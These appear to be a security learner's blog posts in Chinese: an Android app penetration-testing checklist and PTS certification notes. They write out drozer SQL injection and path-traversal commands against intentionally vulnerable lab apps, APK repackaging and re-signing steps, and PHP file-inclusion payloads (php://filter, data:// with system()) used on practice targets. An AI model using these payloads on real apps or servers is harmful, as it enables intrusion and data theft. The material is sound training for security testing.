src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220210172623725.png" alt="image-20220210172623725"></p><p>service组件漏洞参考<a href="https://bbs.pediy.com/thread-269255.htm%E8%BF%99%E4%B8%AA%E5%90%A7,%E6%84%9F%E8%A7%89%E9%83%BD%E6%98%AF%E6%AF%94%E8%BE%83%E8%80%81%E7%9A%84,%E8%80%8C%E4%B8%94%E4%B8%8D%E7%9F%A5%E9%81%93%E6%80%8E%E4%B9%88%E7%94%A8dz%E5%AE%9E%E7%8E%B0%E6%94%BB%E5%87%BB">https://bbs.pediy.com/thread-269255.htm这个吧,感觉都是比较老的,而且不知道怎么用dz实现攻击</a>.</p><h3 id="Broadcast-Recevier组件安全"><a href="#Broadcast-Recevier组件安全" class="headerlink" title="Broadcast Recevier组件安全"></a>Broadcast Recevier组件安全</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Android中的每个应用程序都可以对自己感兴趣的广播进行注册，这样该程序只会收到自己所关心的广播内容，这些广播可以是来自系统的，也可能是来自其他程序的。Android提供了一套完整的API,允许应用程序自由地发送和接收广播。</span><br><span class="line">广播机制分为两个方面：广播发送者和广播接收者，一般来说，BroadcastReceiver就是广播接收者。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.info  -a org.owasp.goatdroid.fourgoats</span><br><span class="line">run app.broadcast.send --action 广播名 --extra string name lisi</span><br></pre></td></tr></table></figure><p>在xml中用receiver标识,action标识name就是广播名</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220211113532767.png" alt="image-20220211113532767"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220211113719324.png" alt="image-20220211113719324"></p><p>找到对应的类打开发现需要两个字符型参数,使用run app.broadcast.send来发送广播,发多个参数就跟多个extra.发送参数不完整就会造成拒绝服务.</p><h4 id="恶意发送广播"><a href="#恶意发送广播" class="headerlink" title="恶意发送广播"></a>恶意发送广播</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 1234 --extra string message test</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220211114021036.png" alt="image-20220211114021036"></p><h4 id="不带参数造成拒绝服务"><a href="#不带参数造成拒绝服务" class="headerlink" title="不带参数造成拒绝服务"></a>不带参数造成拒绝服务</h4><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220211114103674.png" alt="image-20220211114103674"></p><h3 id="Content-Provider组件安全"><a href="#Content-Provider组件安全" class="headerlink" title="Content Provider组件安全"></a>Content Provider组件安全</h3><p>ContentProvider为存储和读取数据提供了统一的接口，使用表的形式来对数据进行封装，使用ContentProvider可以在不同的应用程序之间共享数据，统一数据的访问方式，保证数据的安全性。</p><p>在xml中用provider标识,先检测组件的exported属性，再检测组件permission、readPermission、writePermissio对应的protectionlevel，最后再检测sdk版本</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220211142007669.png" alt="image-20220211142007669"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220211142151833.png" alt="image-20220211142151833"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.info -a 包名&#x2F;&#x2F;查找导出Provider</span><br><span class="line">run scanner.provider.finduris -a 包名&#x2F;&#x2F;扫描路径查找uri</span><br><span class="line">run app.provider.query uri&#x2F;&#x2F;读取数据</span><br></pre></td></tr></table></figure><p>Uri 是统一资源定位符，外界进程通过 URI 来找到对应的 ContentProvider 和其中的 数据，再进行数据操作。</p><p>在代码中查找Matcher.addURI,也可以找到uri</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220211144352637.png" alt="image-20220211144352637"></p><h4 id="读取uri数据造成信息泄露"><a href="#读取uri数据造成信息泄露" class="headerlink" title="读取uri数据造成信息泄露"></a>读取uri数据造成信息泄露</h4><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220211144612449.png" alt="image-20220211144612449"></p><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a &lt;包名&gt; &#x2F;&#x2F;扫描注入点</span><br><span class="line">run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --projection &quot;* FROM SQLITE_MASTER WHERE type&#x3D;&#39;table&#39;;--&quot;  &#x2F;&#x2F;列出所有表信息</span><br><span class="line">run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --projection &quot;* FROM Key;--&quot;  &#x2F;&#x2F;查看表内容</span><br><span class="line"></span><br><span class="line">run scanner.provider.sqltables -a  com.mwr.example.sieve  &#x2F;&#x2F;列出该app的表信息</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220211162811355.png" alt="image-20220211162811355"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220211163113131.png" alt="image-20220211163113131"></p><h4 id="文件遍历读取"><a href="#文件遍历读取" class="headerlink" title="文件遍历读取"></a>文件遍历读取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.traversal -a &lt;包名&gt;&#x2F;&#x2F;检测文件遍历</span><br><span class="line">run app.provider.read content:&#x2F;&#x2F;com.mwr.example.sieve.FileBackupProvider&#x2F;etc&#x2F;hosts &#x2F;&#x2F;读取文件内容</span><br><span class="line">run app.provider.download content:&#x2F;&#x2F;com.mwr.example.sieve.FileBackupProvider&#x2F;data&#x2F;data&#x2F;com.mwr.example.sieve&#x2F;databases&#x2F;database.db f:&#x2F;home&#x2F;database.db &#x2F;&#x2F;下载系统文件</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220211163844597.png" alt="image-20220211163844597"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220211164329490.png" alt="image-20220211164329490"></p><h3 id="日志信息移除（不懂）"><a href="#日志信息移除（不懂）" class="headerlink" title="日志信息移除（不懂）"></a>日志信息移除（不懂）</h3><p>\1.   反编译apk </p><p>\2.   搜索是否有Log等函数的调用</p><p>\3.   打开log monitor，动态监控应用运行情况（不会）</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220214111342748.png" alt="image-20220214111342748"></p><h3 id="模拟器检测"><a href="#模拟器检测" class="headerlink" title="模拟器检测"></a>模拟器检测</h3><p>检测app是否可以在模拟器环境中正常安装和运行</p><h3 id="进程保护"><a href="#进程保护" class="headerlink" title="进程保护"></a>进程保护</h3><p>检测应用是否可以被调试/注入</p><p>使用的Android Studio和宜昌市民e家app做的测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Android Studio下载地址https:&#x2F;&#x2F;developer.android.google.cn&#x2F;studio&#x2F;</span><br><span class="line">smalidea下载地址https:&#x2F;&#x2F;bitbucket.org&#x2F;JesusFreke&#x2F;smalidea&#x2F;downloads&#x2F;</span><br></pre></td></tr></table></figure><h4 id="smalidea安装"><a href="#smalidea安装" class="headerlink" title="smalidea安装"></a>smalidea安装</h4><p>smalidea是一个IntelliJ IDEA/Android Studio smali语言插件，可实现动态调试smali代码，后面调试时就是调试的smali文件。</p><p>打开 Android Studio 工具，点击 File,选择 Settings,点击 Plugin，再点击 install plugin from disk。找到之前我们下载的 smalidea 插件选中点击 OK。</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215123634461.png" alt="image-20220215123634461"></p><h4 id="把要调试的apk设置为可调试状态"><a href="#把要调试的apk设置为可调试状态" class="headerlink" title="把要调试的apk设置为可调试状态"></a>把要调试的apk设置为可调试状态</h4><p>使用apktool解包apk，找到AndroidManifest.xml文件，在application中设置debug为true，如果没有就手动添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:debuggable&#x3D;&quot;true&quot;</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215115824755.png" alt="image-20220215115824755"></p><p>然后重新把资源目录打包生成新的apk，签名后安装，新安装的apk就是可调试的apk了。</p><p>解包打包签名过程参考程序签名校验模块。</p><p>以上是通过设置AndroidManifest.xml使apk为可调试。</p><p>还有其他的方法比如修改安卓手机的配置文件打开系统调试总开关，，而且当你打开这个开关后手机中的所有 App 都是可以调试的了，未测试这种方法。</p><h4 id="调试设置"><a href="#调试设置" class="headerlink" title="调试设置"></a>调试设置</h4><p>file-profile or debug apk打开上面安装的可调式apk，切换为project试图</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215133900275.png" alt="image-20220215133900275"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215134010316.png" alt="image-20220215134010316"></p><p>设定 Mark Directory as -&gt; Sources Root</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215134237635.png" alt="image-20220215134237635"></p><p>打开 AndroidStudio 的 File -&gt; Project Structure 选择,选择对应的 JDK</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215134418362.png" alt="image-20220215134418362"></p><p>配置远程调试的选项，选择 Run–&gt;Edit Configurations 选项，点击“+”号，新建 remote 类型调试器，设置 Name，修改端口号，可以选择未被占用的任意端口，这里设 置为 8700</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215134551113.png" alt="image-20220215134551113"></p><p>然后过程中还按照Android Studio提示安装了sdk和Android api，软件会自己提示，点击下载就可以。</p><p>模拟器上打开要调试的apk，找到对应的进程端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb -s emulator-5554 shell ps | findstr ycehome&#x2F;&#x2F;-s是指定device，ycehome是要调试的apk包名</span><br><span class="line">adb forward tcp:8700 jdwp:2046&#x2F;&#x2F;端口转发，其中的“tcp”是之前配置调试环境时指定的端口号，“jdwp”这里指的是我们要调试的程序的进程 pid。这里是将本地端口（PC 端口）映射到远程端口（手机端口），之后 PC 端访问 8700 端口的数据</span><br><span class="line">包，会自动转发到手机的 3267 端口。</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215135228128.png" alt="image-20220215135228128"></p><p>才开始点击调试按钮报connection reset错误</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215135328637.png" alt="image-20220215135328637"></p><p>后来通过run-attach debugger to android process成功开启调试，选中要调试的apk包名</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215135443539.png" alt="image-20220215135443539"></p><p>说是输出下面信息代表成功。貌似上面设置端口和开启转发都没用到。</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215135844984.png" alt="image-20220215135844984"></p><h4 id="断点和调试"><a href="#断点和调试" class="headerlink" title="断点和调试"></a>断点和调试</h4><p>要先找到smali文件位置，比如MainActivity.smali，搜调试的apk解包资源目录</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215141333858.png" alt="image-20220215141333858"></p><p>找到路径下的文件打开</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215141910824.png" alt="image-20220215141910824"></p><p>当点击左上角的登录时就能触发到断点位置onOptionsItemSelected方法，进入调试状态</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215142331841.png" alt="image-20220215142331841"></p><p>也就代表进程保护存在调试风险。</p><h3 id="ROOT环境检测"><a href="#ROOT环境检测" class="headerlink" title="ROOT环境检测"></a>ROOT环境检测</h3><p>1、将被测App安装在ROOT运行环境中；</p><p>2、运行App，确认是否能够正常运行并提示用户</p><p>建议：通过检测特殊文件等方法检测ROOT环境，如果发现在ROOT环境中运行，则弹窗提示用户在不安全环境中运行，或者禁止运行。</p><h3 id="Webview安全（不懂）"><a href="#Webview安全（不懂）" class="headerlink" title="Webview安全（不懂）"></a>Webview安全（不懂）</h3><p>WebView下有一个非常特殊的接口函数addJavascriptInterface，它能实现本地java和js的交互。利用addJavascriptInterface这个接口函数可实现穿透webkit执行任意代码；Webview中开启javascript后，使用setAllowFileAccess(true)，App可通过webview访问私有目录下的文件数据。</p><p>\1.    查看AndroidManifest.xml文件，检查targetSdkVersion版本，低于17存在webkit执行任意代码漏洞</p><p>\2.    对于API17以下的系统，检查是否对js调用参数进行了过滤</p><p>\3.    检查是否webview是否开启了javascript，检测是否存在本地文件访问漏洞</p><p>也就第一步能看懂，而且不知道为啥明明版本大于17，还是存在风险</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215145111621.png" alt="image-20220215145111621"></p><h3 id="ZIP文件解压目录遍历漏洞（不懂）"><a href="#ZIP文件解压目录遍历漏洞（不懂）" class="headerlink" title="ZIP文件解压目录遍历漏洞（不懂）"></a>ZIP文件解压目录遍历漏洞（不懂）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">风险描述由于zip允许其中的文件含有“..&#x2F;”、“¥”等特殊字符，当从不安全的来源如HTTP下载或者SDK卡获得ZIP格式文件并解压缩时，如果该ZIP文件被劫持插入恶意代码，且没有禁止ZIP目录遍历，可能导致任意代码执行。</span><br><span class="line">测试目的检测ZipEntry类调用，检查是否对&quot;..&#x2F;&quot;特殊字符进行了过滤处理，如未处理，在解压文件时可能会导致覆盖本应用下的沙盒数据</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220215150048639.png" alt="image-20220215150048639"></p><h2 id="源码-代码安全"><a href="#源码-代码安全" class="headerlink" title="源码/代码安全"></a>源码/代码安全</h2><h3 id="程序签名校验"><a href="#程序签名校验" class="headerlink" title="程序签名校验"></a>程序签名校验</h3><p>签名证书是否规范，应用如果没有正确的签名，则存在被恶意利用风险；如果没有做签名校验，存在被二次打包的风险</p><p>1、使用apktool解包apk</p><p>2、重新打包并使用自定义签名</p><p>3、运行程序</p><h4 id="查看apk原版签名"><a href="#查看apk原版签名" class="headerlink" title="查看apk原版签名"></a>查看apk原版签名</h4><p>把apk用压缩软件打开，找到META-INF目录下后缀为RSA的文件，用keytool查看签名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -printcert -file XXX.RSA</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220214155549105.png" alt="image-20220214155549105"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220214155649006.png" alt="image-20220214155649006"></p><h4 id="反编译apk"><a href="#反编译apk" class="headerlink" title="反编译apk"></a>反编译apk</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apktool_2.6.0.jar d -f XXX.apk  &#x2F;&#x2F;生成apk的资源目录</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220214160040894.png" alt="image-20220214160040894"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220214160056460.png" alt="image-20220214160056460"></p><h4 id="重新打包成apk"><a href="#重新打包成apk" class="headerlink" title="重新打包成apk"></a>重新打包成apk</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool_2.6.0.jar b 资源目录名    &#x2F;&#x2F;b是build的简写，新生成的apk在资源目录下的dist目录中，并且用压缩软件打开发现是没有META-INF目录的，也就是没有签名的，这时候安装会提示缺少签名</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220214160242485.png" alt="image-20220214160242485"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220214160321580.png" alt="image-20220214160321580"></p><h4 id="新建签名"><a href="#新建签名" class="headerlink" title="新建签名"></a>新建签名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -alias jackadam -keyalg RSA -validity 4444 -keystore jackadam.keystore &#x2F;&#x2F;jackadam是自定义的名称，4444是有效时间天数，jackadam.keystore是生成的签名文件名</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220214160831004.png" alt="image-20220214160831004"></p><h4 id="给apk签名"><a href="#给apk签名" class="headerlink" title="给apk签名"></a>给apk签名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verbose -keystore C:\Users\i\Desktop\apk\jackadam.keystore -signedjar signed.apk C:\Users\i\Desktop\apk\smej\dist\debug.apk jackadam</span><br><span class="line">&#x2F;&#x2F;C:\Users\i\Desktop\apk\jackadam.keystore是签名文件地址</span><br><span class="line">&#x2F;&#x2F;signed.apk是生成的apk名称</span><br><span class="line">&#x2F;&#x2F;C:\Users\i\Desktop\apk\smej\dist\debug.apk是待签名的apk</span><br><span class="line">&#x2F;&#x2F;jackadam和上面新建签名的一样</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220214165249104.png" alt="image-20220214165249104"></p><p>新生成的apk里面的签名文件就是我们刚刚自定义的签名</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220214161137770.png" alt="image-20220214161137770"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220214161213300.png" alt="image-20220214161213300"></p><p>把自定义签名的apk安装发现可以成功运行就是有风险的</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220214161322503.png" alt="image-20220214161322503"></p><h3 id="代码混淆保护（不懂）"><a href="#代码混淆保护（不懂）" class="headerlink" title="代码混淆保护（不懂）"></a>代码混淆保护（不懂）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">风险描述代码混淆可以有效的保护应用，使得反编译后的代码难以阅读，增加破解难度。未进行代码混淆的应用被破解风险较大</span><br><span class="line">测试目的通过判断代码的混淆程度来评估代码安全性</span><br></pre></td></tr></table></figure><h3 id="DEX文件保护（不懂）"><a href="#DEX文件保护（不懂）" class="headerlink" title="DEX文件保护（不懂）"></a>DEX文件保护（不懂）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">风险描述DEX是Android应用的可执行文件，未加密的Dex存在被反编译的风险，造成代码逻辑的暴露</span><br><span class="line">测试目的检测程序可执行文件Dex是否做加密处理</span><br></pre></td></tr></table></figure><h3 id="资源文件保护"><a href="#资源文件保护" class="headerlink" title="资源文件保护"></a>资源文件保护</h3><p>测试目的    检测程序的关键资源文件是否做加密处理</p><p>比如证书类信息，反编译apk，查找有无证书类信息，存在类似明文信息则存在风险</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220216102530603.png" alt="image-20220216102530603"></p><h2 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h2><h3 id="键盘输入信息"><a href="#键盘输入信息" class="headerlink" title="键盘输入信息"></a>键盘输入信息</h3><p>测试过程    </p><ol><li><p>在软件界面进行登录密码登陆测试</p></li><li><p>查看输入结果是否为明文显示</p></li><li><p>检查是否使用自定义键盘输入截屏敏感信息</p></li></ol><h3 id="截屏敏感信息"><a href="#截屏敏感信息" class="headerlink" title="截屏敏感信息"></a>截屏敏感信息</h3><p>   检测用户在进行输入操作时，输入的数据是否会被其他终端或其他程序非法截屏获取</p><h3 id="存储敏感数据信息"><a href="#存储敏感数据信息" class="headerlink" title="存储敏感数据信息"></a>存储敏感数据信息</h3><p>检测程序是否本地保存账号、密码、加密key、第三方应用key等用户的敏感信息</p><p>\1.   查看/data/data/packagename目录下shared_prefs、databases、files等目录下的xml或其他文件文本文件</p><p>\2.   查看是否保存了用户的敏感信息</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220216104958404.png" alt="image-20220216104958404"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220216105234824.png" alt="image-20220216105234824"></p><h3 id="数据访问控制"><a href="#数据访问控制" class="headerlink" title="数据访问控制"></a>数据访问控制</h3><p>\1.   查找本地存储/data/data/packagename是否含有shared_prefs、databases、files文件</p><p>\2.   查看这些文件的权限，确定是否可以被其它应用访问</p><h3 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h3><p>当在AndroidManifest.xml文件中未设置android:allowBackup属性值或设置android:allowBackup=”true”时，可对应用程序私有目录下的所有数据进行备份。false无风险。</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220216105512860.png" alt="image-20220216105512860"></p><h3 id="SSL安全配置"><a href="#SSL安全配置" class="headerlink" title="SSL安全配置"></a>SSL安全配置</h3><p>检测程序在与服务器通信过程中，敏感数据是否选择安全通信协议；检测程序与服务器的通信验证是否有证书，是否有证书合法性和一致性校验</p><p>1、通过burpsuit抓包，查看是否采用安全协议</p><p>2、检查SSL协议是否使用了证书绑定，通过安装burpsuit证书后，测试能否抓取到数据包</p><p>要求：客户端与服务端通信会话采用HTTPS，同时TLS版本要高于1.0，并对证书信息进行校验与绑定</p><h3 id="关键数据加密传输"><a href="#关键数据加密传输" class="headerlink" title="关键数据加密传输"></a>关键数据加密传输</h3><p>客户端程序提交数据给服务端时，密码、收款人信息等关键字段如果未进行加密处理，可能会被恶意用户嗅探到用户数据包中的密码等敏感信息，造成信息泄漏。</p><p>\1.   打开burp suite，截获用户在登录等包含敏感信息过程中的数据包</p><p>\2.   查看数据包，看是否对用户名、密码等敏感信息进行了加密</p><p>看抓包信息不局限于账密，身份证号和手机号类的也是</p><h2 id="隐私合规"><a href="#隐私合规" class="headerlink" title="隐私合规"></a>隐私合规</h2><h3 id="隐私数据收集合规"><a href="#隐私数据收集合规" class="headerlink" title="隐私数据收集合规"></a>隐私数据收集合规</h3><p>检测APP中是否有隐私政策说明并明显提示；是否明示收集个人信息的目的、方法与范围； APP中收集个人信息的方式方法是否合规；APP中是否有提供更正个人信息的功能及投诉渠道。</p><p>1、检查APP中是否有隐私政策说明信息；</p><p>2、检查APP中打开的隐私权限信息；</p><p>3、通过隐私相关API的调用来分析个人信息收集行为；</p><p>4、通过抓取网络数据来分析个人信息收集行为；</p><p>这些都是申请的权限</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220216110214653.png" alt="image-20220216110214653"></p><p>修复建议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、建议不申请与业务功能无关的敏感权限</span><br><span class="line">2、增加隐私政策说明信息，说明个人信息处理规则等（个人敏感信息主要包括：财产信息、身份信息、通讯记录、定位等等）；要求在首次运行时通过弹窗等明显方式提示用户，并且查阅隐私政策说明信息不能采用多于4次点击的方式；</span><br><span class="line">3、收集个人信息和打开相关权限时，需征得用户同意；如用户拒绝后，不得频繁征求用户同意，干扰用户的正常使用；收集的信息不得超过用户的授权范围</span><br><span class="line">4、不收集和打开与业务功能无关的个人信息、权限等</span><br><span class="line">5、提供修正、删除个人信息及注销账户的功能，提供个人信息安全投诉、举报的渠道。</span><br><span class="line">注：详细隐私规范要求请见《App违法违规收集使用个人信息行为认定方法》</span><br></pre></td></tr></table></figure><p>看着王海兵大佬的报告照猫画虎，都不是很理解，感觉写的很臭长也很煎熬</p>]]></content>
      
      
      
        <tags>
            
            <tag> app </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pts学习</title>
      <link href="2021/12/15/pts%E5%AD%A6%E4%B9%A0/"/>
      <url>2021/12/15/pts%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">各种方式多尝试</span><br><span class="line">多看源码</span><br><span class="line">多看robots文件</span><br><span class="line">多记命令</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1-key1</span><br><span class="line">2-key2</span><br><span class="line">3-key3</span><br><span class="line">4----wireshark</span><br><span class="line">5----3个key</span><br><span class="line">6----3个key</span><br><span class="line"></span><br><span class="line">5-10 题  key</span><br><span class="line">key pte&#x2F;pts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pte   cat ls  管道符   </span><br><span class="line">pts   管道符 直接过滤掉</span><br><span class="line"></span><br><span class="line">vmware   docker</span><br><span class="line"></span><br><span class="line">带上自己的电脑和身份证</span><br><span class="line"></span><br><span class="line">获取KEY值之后需要粘到另一个地方----------粘的对不对，尽力不要手动输入</span><br><span class="line"></span><br><span class="line">PTE考察文件上传  3个过滤条件</span><br><span class="line">PTS              5-4个过滤条件</span><br><span class="line">redis未授权访问+sshkey密钥替换（注意端口    6379-）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">平时练习的时候--题目名字一样---题目内容是不一样的，换个过滤条件就是一个新题</span><br><span class="line">PTE  2次考试机会   PTE 2500元</span><br><span class="line">PTS  3次考试机会   PTS 4000元</span><br></pre></td></tr></table></figure><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="12-15"><a href="#12-15" class="headerlink" title="12.15"></a>12.15</h3><p>提示在根目录下key.php中</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215172129097.png" alt="image-20211215172129097"></p><p>访问一下key.php是200，源码无其他内容</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215172317468.png" alt="image-20211215172317468"></p><p>点击进入答题，很明显在file参数</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215172425061.png" alt="image-20211215172425061"></p><p>还是要访问view.html看下，源码未发现其他内容</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215172637814.png" alt="image-20211215172637814"></p><p>利用伪协议读取base64加密的key.php</p><p><a href="http://49.232.193.10:83/vulnerabilities/fu1.php?file=php://filter/read=convert.base64-encode/resource=../key.php">http://49.232.193.10:83/vulnerabilities/fu1.php?file=php://filter/read=convert.base64-encode/resource=../key.php</a></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215172817745.png" alt="image-20211215172817745"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215173133049.png" alt="image-20211215173133049"></p><h3 id="12-16"><a href="#12-16" class="headerlink" title="12.16"></a>12.16</h3><p>会自动添加txt后缀</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235302830.png" alt="image-20211216235302830"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235314262.png" alt="image-20211216235314262"></p><p>使用远程包含，考试的时候无法连接外网，只能本地起个http服务</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235529296.png" alt="image-20211216235529296"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;150.158.27.164:83&#x2F;start&#x2F;index.php?page&#x3D;data:text&#x2F;plain,&lt;?php system(&quot;cat ..&#x2F;key.php&quot;)?&gt;?</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217000525050.png" alt="image-20211217000525050"></p><h3 id="12-17"><a href="#12-17" class="headerlink" title="12.17"></a>12.17</h3><p>伪协议双写</p><p><img 